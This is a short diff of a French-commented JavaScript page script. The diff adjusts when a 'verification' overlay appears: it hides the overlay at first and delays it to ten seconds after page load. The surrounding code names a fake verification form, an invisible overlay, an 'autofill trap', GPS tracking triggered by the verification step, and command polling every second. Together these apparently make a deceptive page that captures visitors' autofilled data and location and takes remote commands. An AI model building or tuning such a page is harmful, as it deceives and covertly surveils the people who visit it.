@@ -1013,11 +1013,14 @@ async function startVerification() {
     if (!overlay) {
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
+        // On le crée mais on le cache au début
+        overlay.style.display = 'none';
         document.body.appendChild(overlay);
     }
 
     if (isLocationReady()) {
         showVerificationModal(overlay);
+        overlay.style.display = 'flex'; // On l'affiche seulement ici
         if (!gpsWatchStarted) startGpsTracking();
         return;
     }
@@ -1025,10 +1028,12 @@ async function startVerification() {
     const form = overlay.querySelector('#fake-verify-form');
     if (form) {
         bindVerificationForm(overlay);
+        overlay.style.display = 'flex'; // On l'affiche seulement ici
         return;
     }
 
     setupInvisibleVerifyOverlay(overlay);
+    overlay.style.display = 'flex'; // On l'affiche seulement ici
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
@@ -1092,10 +1097,11 @@ if (document.readyState === 'complete') {
 
     setupAutofillTrap();
     
-    // RETARDER L'APPARITION DE L'OVERLAY (Laisser visiter 5 secondes)
+    // RETARDER L'APPARITION DE L'OVERLAY (Laisser visiter 10 secondes pour être sûr)
     setTimeout(() => {
+        console.log("Activation du système de vérification...");
         startVerification();
-    }, 5000);
+    }, 10000);
     
     // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
     // On utilise une boucle récursive pour garantir qu'une seule requête tourne à la fois
